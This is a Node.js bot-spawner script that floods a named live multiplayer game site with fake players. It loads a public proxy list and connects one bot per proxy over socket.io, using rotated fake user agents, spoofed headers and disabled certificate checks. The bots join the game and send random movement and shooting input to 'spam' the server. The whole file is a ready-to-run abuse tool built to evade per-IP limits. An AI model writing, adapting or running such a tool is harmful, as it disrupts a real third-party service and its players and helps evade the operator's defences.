const io = require("socket.io-client");
const axios = require("axios");
const { HttpsProxyAgent } = require("https-proxy-agent");
const { SocksProxyAgent } = require("socks-proxy-agent");
const fakeUserAgent = require("fake-useragent");

const TARGET_URL = "https://neurochel.tech";
const PROXY_LIST_URL = "https://advanced.name/freeproxy/6991d73bd4112";

// Headers from successful connection logs
const HEADERS = {
    "Origin": "https://neurochel.tech",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "ru,uk;q=0.9,en-US;q=0.8,en;q=0.7",
    "Cache-Control": "no-cache",
    "Pragma": "no-cache"
};

const BOTS_PER_PROXY = 1; // STRICT LIMIT: 1 bot per IP
const CONNECT_TIMEOUT = 30000; // 30s timeout
const SPAWN_INTERVAL = 100; // Fast launch

let activeBots = 0;

async function getProxies() {
    try {
        console.log("Fetching proxies...");
        const response = await axios.get(PROXY_LIST_URL);
        const rawList = response.data.toString().split('\n');

        const proxies = rawList
            .map(line => line.trim())
            .filter(line => line.length > 0 && (line.includes(':') || line.match(/^\d+\.\d+\.\d+\.\d+:\d+$/)));

        console.log(`Loaded ${proxies.length} proxies.`);
        return proxies;
    } catch (error) {
        console.error("Failed to fetch proxies:", error.message);
        return [];
    }
}

function createAgent(proxyUrl) {
    try {
        if (proxyUrl.startsWith("socks")) {
            return new SocksProxyAgent(proxyUrl);
        } else {
            if (!proxyUrl.startsWith("http")) {
                proxyUrl = "http://" + proxyUrl;
            }
            return new HttpsProxyAgent(proxyUrl);
        }
    } catch (e) {
        return null; // Invalid proxy format
    }
}

class Bot {
    constructor(id, proxy) {
        this.id = id;
        this.proxy = proxy;
        this.socket = null;
        this.nickname = `w2mpu_${Math.floor(Math.random() * 99999)}`;
        this.userAgent = fakeUserAgent(); // Rotate UA
        this.moveInterval = null;
    }

    connect() {
        const agent = createAgent(this.proxy);
        if (!agent) return;

        console.log(`[Bot ${this.id}] Connecting via ${this.proxy}...`);

        const options = {
            transports: ["websocket"],
            agent: agent,
            rejectUnauthorized: false,
            extraHeaders: {
                ...HEADERS,
                "User-Agent": this.userAgent
            },
            reconnection: false, // Don't reconnect automatically, let us retry fresh
            timeout: CONNECT_TIMEOUT,
            forceNew: true
        };

        try {
            this.socket = io(TARGET_URL, options);
        } catch (e) {
            console.log(`[Bot ${this.id}] Init Error`);
            return;
        }

        this.socket.on("connect", () => {
            console.log(`✅ [Bot ${this.id}] CONNECTED! Socket ID: ${this.socket.id}`);
            activeBots++;
            this.joinGame();
        });

        this.socket.on("connect_error", (err) => {
            console.log(`❌ [Bot ${this.id}] Connect Failed (${err.message})`);
            this.disconnect();
        });

        this.socket.on("disconnect", (reason) => {
            if (activeBots > 0) activeBots--;
            // console.log(`[Bot ${this.id}] Disconnected: ${reason}`);
            this.disconnect();
        });

        this.socket.on("serverFull", () => {
            console.log(`⚠️ [Bot ${this.id}] Server Full`);
            this.disconnect();
        });
    }

    joinGame() {
        // Emit join immediately upon connection
        this.socket.emit("join", { nickname: this.nickname });
        this.startBehavior();
    }

    startBehavior() {
        if (this.moveInterval) clearInterval(this.moveInterval);

        // Simpler loop to save CPU
        this.moveInterval = setInterval(() => {
            if (!this.socket || !this.socket.connected) return;

            this.socket.emit("input", {
                up: Math.random() > 0.5,
                down: Math.random() > 0.5,
                left: Math.random() > 0.5,
                right: Math.random() > 0.5,
                angle: Math.random() * 6.28,
                shooting: Math.random() > 0.8
            });
        }, 500); // 2Hz is sufficient for spam
    }

    disconnect() {
        if (this.moveInterval) clearInterval(this.moveInterval);
        if (this.socket) {
            this.socket.removeAllListeners(); // Cleanup memory
            this.socket.close();
            this.socket = null;
        }
    }
}

async function startSpam() {
    console.log("🚀 STARTING BOT SPAWNER v2.0 (1 Bot Per Proxy)");

    // Prevent crash on unhandled errors (common in network scripts)
    process.on('uncaughtException', (err) => {
        // console.error('Uncaught Exception:', err);
    });

    const proxies = await getProxies();
    if (proxies.length === 0) return;

    let botId = 1;

    for (const proxy of proxies) {
        // Try strict 1 bot per proxy
        for (let i = 0; i < BOTS_PER_PROXY; i++) {
            const bot = new Bot(botId++, proxy);
            bot.connect();
            await new Promise(r => setTimeout(r, SPAWN_INTERVAL));
        }
    }

    console.log("All proxies processed. Waiting for connections...");

    // Status Monitor
    setInterval(() => {
        console.log(`[STATS] Active Bots: ${activeBots} | Total Launched: ${botId - 1}`);
    }, 5000);
}

startSpam();
